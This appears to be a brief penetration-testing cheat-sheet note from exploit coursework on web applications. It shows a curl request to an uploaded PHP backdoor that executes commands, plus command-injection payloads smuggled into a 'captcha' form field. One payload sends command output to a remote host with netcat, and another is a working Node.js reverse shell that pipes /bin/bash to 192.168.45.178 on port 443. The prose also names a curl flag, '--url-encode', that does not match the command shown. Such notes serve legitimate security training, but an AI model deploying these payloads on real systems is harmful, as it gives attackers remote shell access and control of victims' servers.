While the vulnerabilities are not dependent on specific programming languages or web frameworks, their exploitation may be. Therefore, **we should always take the time to briefly understand the web technologies being used before we attempt to exploit them.**

#### Encoding Curl Requests 

It is recommended to automatically encode curl requests by using the --url-encode flag. An example is shown here:

```bash
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
```

#### Command Injection

```bash
full_name=admin&address=admin&card=admin&cvc=111&date=2222&captcha=require('child_process').exec('id|nc+192.168.45.178 443')
captcha=3;(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/bash", []);var client = new net.Socket();client.connect(443, "192.168.45.178", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()
```